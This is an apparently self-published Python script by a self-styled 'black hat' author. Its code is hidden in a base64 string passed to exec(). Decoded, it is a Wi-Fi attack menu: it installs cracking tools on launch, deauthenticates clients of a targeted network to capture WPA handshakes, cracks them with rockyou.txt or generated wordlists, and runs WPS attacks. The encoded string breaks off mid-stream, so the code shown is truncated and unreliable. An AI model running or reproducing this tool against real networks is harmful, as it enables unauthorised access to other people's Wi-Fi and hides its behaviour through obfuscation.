###########################################################################
# AUTHOR  : AKASH BLACK HAT                                               #
# WHATSAPP: +91 8389020949                                                #
# HACKING GROUP :https://www.facebook.com/AKASHBLACKHAT                   #
# YOUTUBE : TECHNICAL AKASH SKILLS                                        #
###########################################################################
import marshal,base64
exec (base64.b64decode("CiMgQ29hZGVyL0FrYXNoQmxhY2tIYXQKIyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwppbXBvcnQgb3MKaW1wb3J0IHN1YnByb2Nlc3MKZnJvbSBzdWJwcm9jZXNzIGltcG9ydCBjaGVja19jYWxsCnByaW50KCJcbkluc3RhbGxpbmcgTmVlZGVkIFRvb2xzIikKcHJpbnQoIlxuIikKY21kMCA9IG9zLnN5c3RlbSgiYXB0LWdldCBpbnN0YWxsIGFpcmNyYWNrLW5nIGNydW5jaCB4dGVybSB3b3JkbGlzdHMgcmVhdmVyIHBpeGlld3BzIGJ1bGx5IHh0ZXJtIHdpZml0ZSIpCmNtZCAgPSBvcy5zeXN0ZW0oInNsZWVwIDMgJiYgY2xlYXIiKQpkZWYgaW50cm8oKToKICAgIGNtZCAgPSBvcy5zeXN0ZW0oImNsZWFyIikKICAgIHByaW50KCIiIlwwMzNbMTszMm0K4paI4paI4pWXICAgIOKWiOKWiOKVl+KWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKVlyAgIOKWiOKWiOKVlyAg4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKVlyAg4paI4paI4paI4paI4paI4paI4pWX4paI4paI4pWXICDilojilojilZfilojilojilZfilojilojilojilZcgICDilojilojilZcg4paI4paI4paI4paI4paI4paI4pWXICAgICAK4paI4paI4pWRICAgIOKWiOKWiOKVkeKWiOKWiOKVkeKWiOKWiOKVlOKVkOKVkOKVkOKVkOKVneKWiOKWiOKVkSAgIOKWiOKWiOKVkSAg4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWd4paI4paI4pWRIOKWiOKWiOKVlOKVneKWiOKWiOKVkeKWiOKWiOKWiOKWiOKVlyAg4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWdICAgICAK4paI4paI4pWRIOKWiOKVlyDilojilojilZHilojilojilZHilojilojilojilojilojilZcgIOKWiOKWiOKVkSAgIOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVkeKWiOKWiOKVkSAgICAg4paI4paI4paI4paI4paI4pWU4pWdIOKWiOKWiOKVkeKWiOKWiOKVlOKWiOKWiOKVlyDilojilojilZHilojilojilZEgIOKWiOKWiOKWiOKVlyAgICAK4paI4paI4pWR4paI4paI4paI4pWX4paI4paI4pWR4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4pWdICDilojilojilZEgICDilojilojilZTilZDilZDilojilojilZHilojilojilZTilZDilZDilojilojilZHilojilojilZEgICAgIOKWiOKWiOKVlOKVkOKWiOKWiOKVlyDilojilojilZHilojilojilZHilZrilojilojilZfilojilojilZHilojilojilZEgICDilojilojilZEgICAgCuKVmuKWiOKWiOKWiOKVlOKWiOKWiOKWiOKVlOKVneKWiOKWiOKVkeKWiOKWiOKVkSAgICAg4paI4paI4pWRICAg4paI4paI4pWRICDilojilojilZHilojilojilZEgIOKWiOKWiOKVkeKVmuKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKVkSAg4paI4paI4pWX4paI4paI4pWR4paI4paI4pWRIOKVmuKWiOKWiOKWiOKWiOKVkeKVmuKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVnSAgICAKIOKVmuKVkOKVkOKVneKVmuKVkOKVkOKVnSDilZrilZDilZ3ilZrilZDilZ0gICAgIOKVmuKVkOKVnSAgIOKVmuKVkOKVnSAg4pWa4pWQ4pWd4pWa4pWQ4pWdICDilZrilZDilZ0g4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWd4pWa4pWQ4pWdICDilZrilZDilZ3ilZrilZDilZ3ilZrilZDilZ0gIOKVmuKVkOKVkOKVkOKVnSDilZrilZDilZDilZDilZDilZDilZ0KQXV0aG9yICA6IEFLQVNIIEJMQUNLIEhBVApZb3VUdWIgIDogVEVDSE5JQ0FMIEFLQVNIIFNLSUxMUyAKR3JvdXAgICA6IGh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9BS0FTSEJMQUNLSEFUCldoYXRzQXBwOiArOTEgODM4OTAyMDk0OQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tICAKKDEpU3RhcnQgbW9uaXRvciBtb2RlICAgICAgIAooMilTdG9wIG1vbml0b3IgbW9kZQooMylTY2FuIE5ldHdvcmtzICAgICAgICAgICAgICAgICAgICAgICAgICAgIAooNClHZXR0aW5nIEhhbmRzaGFrZShtb25pdG9yIG1vZGUgbmVlZGVkKSAgIAooNSlJbnN0YWxsIFdpcmVsZXNzIHRvb2xzICAgICAgICAgICAgICAgICAgIAooNilDcmFjayBIYW5kc2hha2Ugd2l0aCByb2NreW91LnR4dCAoSGFuZHNoYWtlIG5lZWRlZCkKKDcpQ3JhY2sgSGFuZHNoYWtlIHdpdGggd29yZGxpc3QgICAgKEhhbmRzaGFrZSBuZWVkZWQpCig4KUNyYWNrIEhhbmRzaGFrZSB3aXRob3V0IHdvcmRsaXN0IChIYW5kc2hha2UsZXNzaWQgbmVlZGVkKQooOSlDcmVhdGUgd29yZGxpc3QgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCigxMClXUFMgTmV0d29ya3MgYXR0YWNrcyAoQnNzaWQsbW9uaXRvciBtb2RlIG5lZWRlZCkKKDExKVNjYW4gZm9yIFdQUyBOZXR3b3JrcwoKKDApQWJvdXQgTWUKKDAwKUV4aXQKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gIiIiKQogICAgcHJpbnQoIlxuRW50ZXIgeW91ciBjaG9pc2UgaGVyZSA6ICEjICIpCiAgICB2YXIgPSBpbnQoaW5wdXQoIiIpKQogICAgaWYgdmFyID09IDEgOgogICAgICAgIHByaW50KCJcbkVudGVyIHRoZSBpbnRlcmZhY2U6KERlZmF1bHQod2xhbjAvd2xhbjEpKSIpCiAgICAgICAgaW50ZXJmYWNlID0gaW5wdXQoIiIpCiAgICAgICAgb3JkZXIgPSAiYWlybW9uLW5nIHN0YXJ0IHt9ICYmIGFpcm1vbi1uZyBjaGVjayBraWxsIi5mb3JtYXQoaW50ZXJmYWNlKQogICAgICAgIGdlbnkgID0gb3Muc3lzdGVtKG9yZGVyKQogICAgICAgIGludHJvKCkKICAgIGVsaWYgdmFyID09IDIgOgogICAgICAgIHByaW50KCJcbkVudGVyIHRoZSBpbnRlcmZhY2U6KERlZmF1bHQod2xhbjBtb24vd2xhbjFtb24pKSIpCiAgICAgICAgaW50ZXJmYWNlID0gaW5wdXQoIiIpCiAgICAgICAgb3JkZXIgPSAiYWlybW9uLW5nIHN0b3Age30gJiYgc2VydmljZSBuZXR3b3JrLW1hbmFnZXIgcmVzdGFydCIuZm9ybWF0KGludGVyZmFjZSkKICAgICAgICBnZW55ICA9IG9zLnN5c3RlbShvcmRlcikKICAgICAgICBpbnRybygpCiAgICBlbGlmIHZhciA9PSAzIDoKICAgICAgICBwcmludCgiXG5FbnRlciB0aGUgaW50ZXJmYWNlOihEZWZhdWx0ID4+ICh3bGFuMG1vbi93bGFuMW1vbikpIikKICAgICAgICBpbnRlcmZhY2UgPSBpbnB1dCgiIikKICAgICAgICBvcmRlciA9ICJhaXJvZHVtcC1uZyB7fSAtTSIuZm9ybWF0KGludGVyZmFjZSkKICAgICAgICBwcmludCgiV2hlbiBEb25lIFByZXNzIENUUkwrYyIpCiAgICAgICAgY21kID0gb3Muc3lzdGVtKCJzbGVlcCAzIikKICAgICAgICBnZW55ICA9IG9zLnN5c3RlbShvcmRlcikKICAgICAgICBjbWQgPSBvcy5zeXN0ZW0oInNsZWVwIDEwIikKICAgICAgICBpbnRybygpCiAgICBlbGlmIHZhciA9PSA0IDoKICAgICAgICBwcmludCgiXG5FbnRlciB0aGUgaW50ZXJmYWNlOihEZWZhdWx0ID4+KHdsYW4wbW9uL3dsYW4xbW9uKSkiKQogICAgICAgIGludGVyZmFjZSA9IGlucHV0KCIiKQogICAgICAgIG9yZGVyICAgICA9ICJhaXJvZHVtcC1uZyB7fSAtTSIuZm9ybWF0KGludGVyZmFjZSkKICAgICAgICBwcmludCgiXG5XaGVuIERvbmUgUHJlc3MgQ1RSTCtjIikKICAgICAgICBwcmludCgiXG5Ob3RlOiBVbmRlciBQcm9iZSBpdCBtaWdodCBiZSBQYXNzd29yZHMgU28gY29weSB0aGVtIHRvIHRoZSB3b3JsaXN0IGZpbGUiKQogICAgICAgIHByaW50KCJcbkRvbid0IEF0dGFjayBUaGUgTmV0d29yayBpZiBpdHMgRGF0YSBpcyBaRVJPICh5b3Ugd2FzdGUgeW91ciB0aW1lKSIpCiAgICAgICAgcHJpbnQoIlxueW91IENhbiB1c2UgJ3MnIHRvIGFycmFuZ2UgbmV0d29ya3MiKQogICAgICAgIGNtZCAgICAgICA9IG9zLnN5c3RlbSgic2xlZXAgNyIpCiAgICAgICAgZ2VueSAgICAgID0gb3Muc3lzdGVtKG9yZGVyKQogICAgICAgIHByaW50KCJcbkVudGVyIHRoZSBic3NpZCBvZiB0aGUgdGFyZ2V0PyIpCiAgICAgICAgYnNzaWQgICAgID0gc3RyKGlucHV0KCIiKSkKICAgICAgICBwcmludCgiXG5FbnRlciB0aGUgY2hhbm5lbCBvZiB0aGUgbmV0d29yaz8iKQogICAgICAgIGNoYW5uZWwgICA9IGludChpbnB1dCgpKQogICAgICAgIHByaW50KCJFbnRlciB0aGUgcGF0aCBvZiB0aGUgb3V0cHV0IGZpbGUgPyIpCiAgICAgICAgcGF0aCA9IHN0cihpbnB1dCgiIikpCiAgICAgICAgcHJpbnQoIlxuRW50ZXIgdGhlIG51bWJlciBvZiB0aGUgcGFja2V0cyBbMS0xMDAwMF0gKCAwIGZvciB1bmxpbWl0ZWQgbnVtYmVyKSIpCiAgICAgICAgcHJpbnQoInRoZSBudW1iZXIgb2YgdGhlIHBhY2tldHMgRGVwZW5kcyBvbiB0aGUgRGlzdGFuY2UgQmV0d2VlbiB5b3UgYW5kIHRoZSBuZXR3b3JrIikKICAgICAgICBkaXN0ID0gaW50KGlucHV0KCIiKSkKICAgICAgICBvcmRlciA9ICJhaXJvZHVtcC1uZyB7fSAtLWJzc2lkIHt9IC1jIHt9IC13IHt9IHwgeHRlcm0gLWUgYWlyZXBsYXktbmcgLTAge30gLWEge30ge30iLmZvcm1hdChpbnRlcmZhY2UsYnNzaWQsY2hhbm5lbCxwYXRoLGRpc3QsYnNzaWQsaW50ZXJmYWNlKQogICAgICAgIGdlbnkgPSBvcy5zeXN0ZW0ob3JkZXIpCiAgICAgICAgaW50cm8oKQogICAgZWxpZiB2YXIgPT0gNSA6CiAgICAgICAgZGVmIHdpcmUoKToKICAgICAgICAgICAgY21kID0gb3Muc3lzdGVtKCJjbGVhciIpCiAgICAgICAgICAgIHByaW50KCIiIgoxKSBBaXJjcmFjay1uZyAgICAgICAgICAgICAgICAgICAgICAgICAgMTcpIGthbGlicmF0ZS1ydGwKMikgQXNsZWFwICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDE4KSBLaWxsZXJCZWUKMykgQmx1ZWxvZyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDE5KSBLaXNtZXQKNCkgQmx1ZU1haG8gICAgICAgICAgICAgICAgICAgICAgICAgICAgIDIwKSBtZGszCjUpIEJsdWVwb3QgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAyMSkgbWZjdWsKNikgQmx1ZVJhbmdlciAgICAgICAgICAgICAgICAgICAgICAgICAgIDIyKSBtZm9jCjcpIEJsdWVzbmFyZmVyICAgICAgICAgICAgICAgICAgICAgICAgICAyMykgbWZ0ZXJtCjgpIEJ1bGx5ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAyNCkgTXVsdGltb24tTkcKOSkgY29XUEF0dHkgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDI1KSBQaXhpZVdQUwoxMCkgY3JhY2tsZSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMjYpIFJlYXZlcgoxMSkgZWFwbWQ1cGFzcyAgICAgICAgICAgICAgICAgICAgICAgICAgMjcpIHJlZGZhbmcKMTIpIEZlcm4gV2lmaSBDcmFja2VyICAgICAgICAgICAgICAgICAgIDI4KSBSVExTRFIgU2Nhbm5lcgoxMykgR2hvc3QgUGhpc2hlciAgICAgICAgICAgICAgICAgICAgICAgMjkpIFNwb29mdG9vcGgKMTQpIEdJU0tpc21ldCAgICAgICAgICAgICAgICAgICAgICAgICAgIDMwKSBXaWZpIEhvbmV5CjE1KSBXaWZpdGFwICAgICAgICAgICAgICAgICAgICAgICAgICAgICAzMSkgZ3Itc2NhbgoxNikgV2lmaXRlICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMzIpIEJhY2sgdG8gbWFpbiBtZW51CjkwKSBhaXJnZWRkb24KOTEpIHdpZml0ZSB2MgoKMClpbnN0YWxsIGFsbCB3aXJlbGVzcyB0b29scwoiIiIpCiAgICAgICAgICAgIHcgPSBpbnQoaW5wdXQoIkVudGVyIFRoZSBudW1iZXIgb2YgdGhlIHRvb2wgOiA+Pj4gIikpCiAgICAgICAgICAgIGlmIHcgPT0gMSA6CiAgICAgICAgICAgICAgICBjbWQgPSBvcy5zeXN0ZW0oInN1ZG8gYXB0LWdldCB1cGRhdGUgJiYgYXB0LWdldCBpbnN0YWxsIGFpcmNyYWNrLW5nIikKICAgICAgICAgICAgZWxpZiB3ID09IDkwOgogICAgICAgICAgICAgICAgcHJpbnQoInN1ZG8gYXB0LWdldCB1cGRhdGUgJiYgYXB0LWdldCBpbnN0YWxsIGdpdCAmJiBnaXQgY2xvbmUgaHR0cHM6Ly9naXRodWIuY29tL3YxczF0MHIxc2gzcjMvYWlyZ2VkZG9uLmdpdCIpCiAgICAgICAgICAgIGVsaWYgdyA9PSA5MToKICAgICAgICAgICAgICAgIHByaW50KCJzdWRvIGFwdC1nZXQgdXBkYXRlICYmIGFwdC1nZXQgaW5zdGFsbCBnaXQgJiYgZ2l0IGNsb25lIGh0dHBzOi8vZ2l0aHViLmNvbS9kZXJ2ODIvd2lmaXRlMi5naXQiKQogICAgICAgICAgICBlbGlmIHcgPT0gMiA6CiAgICAgICAgICAgICAgICBjbWQgPSBvcy5zeXN0ZW0oInN1ZG8gYXB0LWdldCB1cGRhdGUgJiYgYXB0LWdldCBpbnN0YWxsIGFzbGVlcCIpCiAgICAgICAgICAgIGVsaWYgdyA9PSAzIDoKICAgICAgICAgICAgICAgIGNtZCA9IG9zLnN5c3RlbSgic3VkbyBhcHQtZ2V0IHVwZGF0ZSAmJiBhcHQtZ2V0IGluc3RhbGwgYmx1ZWxvZyIpCiAgICAgICAgICAgIGVsaWYgdyA9PSA0IDoKICAgICAgICAgICAgICAgIGNtZCA9IG9zLnN5c3RlbSgic3VkbyBhcHQtZ2V0IHVwZGF0ZSAmJiBhcHQtZ2V0IGluc3RhbGwgYmx1ZW1haG8iKQogICAgICAgICAgICBlbGlmIHcgPT0gNSA6CiAgICAgICAgICAgICAgICBjbWQgPSBvcy5zeXN0ZW0oInN1ZG8gYXB0LWdldCB1cGRhdGUgJiYgYXB0LWdldCBpbnN0YWxsIGJsdWVwb3QiKQogICAgICAgICAgICBlbGlmIHcgPT0gNiA6CiAgICAgICAgICAgICAgICBjbWQgPSBvcy5zeXN0ZW0oInN1ZG8gYXB0LWdldCB1cGRhdGUgJiYgYXB0LWdldCBpbnN0YWxsIGJsdWVyYW5nZXIiKQogICAgICAgICAgICBlbGlmIHcgPT0gNyA6CiAgICAgICAgICAgICAgICBjbWQgPSBvcy5zeXN0ZW0oInN1ZG8gYXB0LWdldCB1cGRhdGUgJiYgYXB0LWdldCBpbnN0YWxsIGJsdWVzbmFyZmVyIikKICAgICAgICAgICAgZWxpZiB3ID09IDggOgogICAgICAgICAgICAgICAgY21kID0gb3Muc3lzdGVtKCJzdWRvIGFwdC1nZXQgdXBkYXRlICYmIGFwdC1nZXQgaW5zdGFsbCBidWxseSIpCiAgICAgICAgICAgIGVsaWYgdyA9PSA5IDoKICAgICAgICAgICAgICAgIGNtZCA9IG9zLnN5c3RlbSgic3VkbyBhcHQtZ2V0IHVwZGF0ZSAmJiBhcHQtZ2V0IGluc3RhbGwgY293cGF0dHkiKQogICAgICAgICAgICBlbGlmIHcgPT0gMTAgOgogICAgICAgICAgICAgICAgY21kID0gb3Muc3lzdGVtKCJzdWRvIGFwdC1nZXQgdXBkYXRlICYmIGFwdC1nZXQgaW5zdGFsbCBjcmFja2xlIikKICAgICAgICAgICAgZWxpZiB3ID09IDExIDoKICAgICAgICAgICAgICAgIGNtZCA9IG9zLnN5c3RlbSgic3VkbyBhcHQtZ2V0IHVwZGF0ZSAmJiBhcHQtZ2V0IGluc3RhbGwgZWFwbWQ1cGFzcyIpCiAgICAgICAgICAgIGVsaWYgdyA9PSAxMiA6CiAgICAgICAgICAgICAgICBjbWQgPSBvcy5zeXN0ZW0oInN1ZG8gYXB0LWdldCB1cGRhdGUgJiYgYXB0LWdldCBpbnN0YWxsIGZlcm4td2lmaS1jcmFja2VyIikKICAgICAgICAgICAgZWxpZiB3ID09IDEzIDoKICAgICAgICAgICAgICAgIGNtZCA9IG9zLnN5c3RlbSgic3VkbyBhcHQtZ2V0IHVwZGF0ZSAmJiBhcHQtZ2V0IGluc3RhbGwgZ2hvc3QtcGhpc2hlciIpCiAgICAgICAgICAgIGVsaWYgdyA9PSAxNCA6CiAgICAgICAgICAgICAgICBjbWQgPSBvcy5zeXN0ZW0oInN1ZG8gYXB0LWdldCB1cGRhdGUgJiYgYXB0LWdldCBpbnN0YWxsIGdpc2tpc21ldCIpCiAgICAgICAgICAgIGVsaWYgdyA9PSAxNSA6CiAgICAgICAgICAgICAgICBjbWQgPSBvcy5zeXN0ZW0oImFwdC1nZXQgaW5zdGFsbCBnaXQgJiYgZ2l0IGNsb25lIGdpdDovL2dpdC5rYWxpLm9yZy9wYWNrYWdlcy9nci1zY2FuLmdpdCIpCiAgICAgICAgICAgIGVsaWYgdyA9PSAxNiA6CiAgICAgICAgICAgICAgICBjbWQgPSBvcy5zeXN0ZW0oInN1ZG8gYXB0LWdldCB1cGRhdGUgJiYgYXB0LWdldCBpbnN0YWxsIGthbGlicmF0ZS1ydGwiKQogICAgICAgICAgICBlbGlmIHcgPT0gMTcgOgogICAgICAgICAgICAgICAgY21kID0gb3Muc3lzdGVtKCJzdWRvIGFwdC1nZXQgdXBkYXRlICYmIGFwdC1nZXQgaW5zdGFsbCBraWxsZXJiZWUtbmciKQogICAgICAgICAgICBlbGlmIHcgPT0gMTggOgogICAgICAgICAgICAgICAgY21kID0gb3Muc3lzdGVtKCJzdWRvIGFwdC1nZXQgdXBkYXRlICYmIGFwdC1nZXQgaW5zdGFsbCBraXNtZXQiKQogICAgICAgICAgICBlbGlmIHcgPT0gMTkgOgogICAgICAgICAgICAgICAgY21kID0gb3Muc3lzdGVtKCJzdWRvIGFwdC1nZXQgdXBkYXRlICYmIGFwdC1nZXQgaW5zdGFsbCBtZGszIikKICAgICAgICAgICAgZWxpZiB3ID09IDIwIDoKICAgICAgICAgICAgICAgIGNtZCA9IG9zLnN5c3RlbSgic3VkbyBhcHQtZ2V0IHVwZGF0ZSAmJiBhcHQtZ2V0IGluc3RhbGwgbWZjdWsiKQogICAgICAgICAgICBlbGlmIHcgPT0gMjEgOgogICAgICAgICAgICAgICAgY21kID0gb3Muc3lzdGVtKCJzdWRvIGFwdC1nZXQgdXBkYXRlICYmIGFwdC1nZXQgaW5zdGFsbCBtZm9jIikKICAgICAgICAgICAgZWxpZiB3ID09IDIyIDoKICAgICAgICAgICAgICAgIGNtZCA9IG9zLnN5c3RlbSgic3VkbyBhcHQtZ2V0IHVwZGF0ZSAmJiBhcHQtZ2V0IGluc3RhbGwgbWZ0ZXJtIikKICAgICAgICAgICAgZWxpZiB3ID09IDIzIDoKICAgICAgICAgICAgICAgIGNtZCA9IG9zLnN5c3RlbSgic3VkbyBhcHQtZ2V0IHVwZGF0ZSAmJiBhcHQtZ2V0IGluc3RhbGwgbXVsdGltb24tbmciKQogICAgICAgICAgICBlbGlmIHcgPT0gMjQgOgogICAgICAgICAgICAgICAgY21kID0gb3Muc3lzdGVtKCJzdWRvIGFwdC1nZXQgdXBkYXRlICYmIGFwdC1nZXQgaW5zdGFsbCBwaXhpZXdwcyIpCiAgICAgICAgICAgIGVsaWYgdyA9PSAyNSA6CiAgICAgICAgICAgICAgICBjbWQgPSBvcy5zeXN0ZW0oInN1ZG8gYXB0LWdldCB1cGRhdGUgJiYgYXB0LWdldCBpbnN0YWxsIHJlYXZlciIpCiAgICAgICAgICAgIGVsaWYgdyA9PSAyNiA6CiAgICAgICAgICAgICAgICBjbWQgPSBvcy5zeXN0ZW0oInN1ZG8gYXB0LWdldCB1cGRhdGUgJiYgYXB0LWdldCBpbnN0YWxsIHJlZGZhbmciKQogICAgICAgICAgICBlbGlmIHcgPT0gMjcgOgogICAgICAgICAgICAgICAgY21kID0gb3Muc3lzdGVtKCJzdWRvIGFwdC1nZXQgdXBkYXRlICYmIGFwdC1nZXQgaW5zdGFsbCBydGxzZHItc2Nhbm5lciIpCiAgICAgICAgICAgIGVsaWYgdyA9PSAyOCA6CiAgICAgICAgICAgICAgICBjbWQgPSBvcy5zeXN0ZW0oInN1ZG8gYXB0LWdldCB1cGRhdGUgJiYgYXB0LWdldCBpbnN0YWxsIHNwb29mdG9vcGgiKQogICAgICAgICAgICBlbGlmIHcgPT0gMjkgOgogICAgICAgICAgICAgICAgY21kID0gb3Muc3lzdGVtKCJzdWRvIGFwdC1nZXQgdXBkYXRlICYmIGFwdC1nZXQgaW5zdGFsbCB3aWZpLWhvbmV5IikKICAgICAgICAgICAgZWxpZiB3ID09IDMwIDoKICAgICAgICAgICAgICAgIGNtZCA9IG9zLnN5c3RlbSgic3VkbyBhcHQtZ2V0IHVwZGF0ZSAmJiBhcHQtZ2V0IGluc3RhbGwgd2lmaXRhcCIpCiAgICAgICAgICAgIGVsaWYgdyA9PSAzMSA6CiAgICAgICAgICAgICAgICBjbWQgPSBvcy5zeXN0ZW0oInN1ZG8gYXB0LWdldCB1cGRhdGUgJiYgYXB0LWdldCBpbnN0YWxsIHdpZml0ZSIpCiAgICAgICAgICAgIGVsaWYgdyA9PSAzMiA6CiAgICAgICAgICAgICAgICBpbnRybygpCiAgICAgICAgICAgIGVsaWYgdyA9PSAwIDoKICAgICAgICAgICAgICAgIGNtZCA9IG9zLnN5c3RlbSgiYXB0LWdldCBpbnN0YWxsIC15IGFpcmNyYWNrLW5nIGFzbGVhcCBibHVlbG9nIGJsdWVyYW5nZXIgYmx1ZXNuYXJmZXIgYnVsbHkgY293cGF0dHkgY3JhY2tsZSBlYXBtZDVwYXNzIGZlcm4td2lmaS1jcmFja2VyIGdob3N0LXBoaXNoZXIgZ2lza2lzbWV0IGdxcngga2FsaWJyYXRlLXJ0bCBraWxsZXJiZWUga2lzbWV0IG1kazMgbWZjdWsgbWZvYyBtZnRlcm0gbXVsdGltb24tbmcgcGl4aWV3cHMgcmVhdmVyIHJlZGZhbmcgc3Bvb2Z0b29waCB3aWZpLWhvbmV5IHdpZml0YXAgd2lmaXRlIikKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHByaW50KCJOb3QgRm91bmQiKQogICAgICAgICAgICB3aXJlKCkKICAgICAgICB3aXJlKCkKICAgIGVsaWYgdmFyID09IDAgOgogICAgICAgIGNtZCA9IG9zLnN5c3RlbSgiY2xlYXIiKQogICAgICAgIHByaW50KCIiIgpIaS4KTXkgTmFtZSBBS0FTSEJMQUNLSEFUICwgQSBFdGhpY2FsIEhhY2tlcixCdWcgQm91bnR5IEh1bnRlcixDdXJyZW50bHkgV29ya2luZyBhcyBDeWJlciBTZWN1cml0eSBSZXNlYXJjaGVyLgp5b3UgY2FuIGZpbmQgb24gWU9VVFVCRSAhCgpodHRwczovL3d3dy55b3V0dWJlLmNvbS9jaGFubmVsL1VDV2xBVW1CT00wN1JYd3dmWnlmal91dwoKQ29udGFjayBtZSArOTEgODM4OTAyMDk0OQoKRmVlbCBGcmVlIHRvIENvbnRhY3QsCgoiIiIpCiAgICAgICAgcXVpdCgpCiAgICBlbGlmIHZhciA9PSAwMDoKICAgICAgICBleGl0KCkKICAgIGVsaWYgdmFyID09IDY6CiAgICAgICAgaWYgIG9zLnBhdGguZXhpc3RzKCIvdXNyL3NoYXJlL3dvcmRsaXN0cy9yb2NreW91LnR4dCIpPT1UcnVlOgogICAgICAgICAgICBwcmludCgiXG5FbnRlciB0aGUgcGF0aCBvZiB0aGUgaGFuZHNoYWtlIGZpbGUgPyIpCiAgICAgICAgICAgIHBhdGggPSBzdHIoaW5wdXQoIiIpKQogICAgICAgICAgICBvcmRlciA9ICJhaXJjcmFjay1uZyB7fSAtdyAvdXNyL3NoYXJlL3dvcmRsaXN0cy9yb2NreW91LnR4dCIuZm9ybWF0KHBhdGgpCiAgICAgICAgICAgIHByaW50KCJcblRvIGV4aXQgUHJlc3MgQ1RSTCArQyIpCiAgICAgICAgICAgIGdlbnkgID0gb3Muc3lzdGVtKG9yZGVyKQogICAgICAgICAgICBzbGVlcCA9IG9zLnN5c3RlbSgic2xlZXAgNWQiKQogICAgICAgICAgICBleGl0KCkKICAgICAgICBlbGlmIG9zLnBhdGguZXhpc3RzKCIvdXNyL3NoYXJlL3dvcmRsaXN0cy9yb2NreW91LnR4dCIpPT1GYWxzZToKICAgICAgICAgICAgY21kID0gb3Muc3lzdGVtKCJnemlwIC1kIC91c3Ivc2hhcmUvd29yZGxpc3RzL3JvY2t5b3UudHh0Lmd6IikKICAgICAgICAgICAgcHJpbnQoIlxuRW50ZXIgdGhlIHBhdGggb2YgdGhlIGhhbmRzaGFrZSBmaWxlID8iKQogICAgICAgICAgICBwYXRoID0gc3RyKGlucHV0KCIiKSkKICAgICAgICAgICAgb3JkZXIgPSAiYWlyY3JhY2stbmcge30gLXcgL3Vzci9zaGFyZS93b3JkbGlzdHMvcm9ja3lvdS50eHQiLmZvcm1hdChwYXRoKQogICAgICAgICAgICBwcmludCgiXG5UbyBleGl0IFByZXNzIENUUkwgK0MiKQogICAgICAgICAgICBnZW55ICA9IG9zLnN5c3RlbShvcmRlcikKICAgICAgICAgICAgc2xlZXAgPSBvcy5zeXN0ZW0oInNsZWVwIDVkIikKICAgICAgICAgICAgZXhpdCgpCiAgICBlbGlmIHZhciA9PSA3IDoKICAgICAgICBwcmludCgiXG5FbnRlciB0aGUgcGF0aCBvZiB0aGUgaGFuZHNoYWtlIGZpbGUgPyIpCiAgICAgICAgcGF0aCA9IHN0cihpbnB1dCgiIikpCiAgICAgICAgcHJpbnQoIlxuRW50ZXIgdGhlIHBhdGggb2YgdGhlIHdvcmRsaXN0ID8iKQogICAgICAgIHdvcmRsaXN0ID0gc3RyKGlucHV0KCIiKSkKICAgICAgICBvcmRlciA9ICgiYWlyY3JhY2stbmcge30gLXcge30iKS5mb3JtYXQocGF0aCx3b3JkbGlzdCkKICAgICAgICBnZW55ID0gb3Muc3lzdGVtKG9yZGVyKQogICAgICAgIGV4aXQoKQogICAgZWxpZiB2YXIgPT0gOCA6CiAgICAgICAgcHJpbnQoIlxuRW50ZXIgdGhlIGVzc2lkIG9mIHRoZSBuZXR3b3JrID8oQmUgY2FyZWZ1bCB3aGVuIHlvdSB0eXBlIGl0IGFuZCB1c2UgJ3RoZSBuYW1lIG9mIHRoZSBuZXR3b3JrJykgIikKICAgICAgICBlc3NpZCA9IHN0cihpbnB1dCgiIikpCiAgICAgICAgcHJpbnQoIlxuRW50ZXIgdGhlIHBhdGggb2YgdGhlIGhhbmRzaGFrZSBmaWxlID8iKQogICAgICAgIHBhdGggPSBzdHIoaW5wdXQoIiIpKQogICAgICAgIHByaW50KCJcbkVudGVyIHRoZSBtaW5pbXVtIGxlbmd0aCBvZiB0aGUgcGFzc3dvcmQgKDgvNjQpPyIpCiAgICAgICAgbWluaSA9IGludChpbnB1dCgiIikpCiAgICAgICAgcHJpbnQoIlxuRW50ZXIgdGhlIG1heGltdW0gbGVuZ3RoIG9mIHRoZSBwYXNzd29yZCAoOC82NCk/IikKICAgICAgICBtYXggID0gaW50KGlucHV0KCIiKSkKICAgICAgICBwcmludCgiIiIKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCigxKSAgTG93ZXJjYXNlIGNoYXJzICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKGFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6KQooMikgIFVwcGVyY2FzZSBjaGFycyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIChBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWikKKDMpICBOdW1lcmljIGNoYXJzICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAoMDEyMzQ1Njc4OSkKKDQpICBTeW1ib2wgY2hhcnMgICAgICAgICAgICAgICA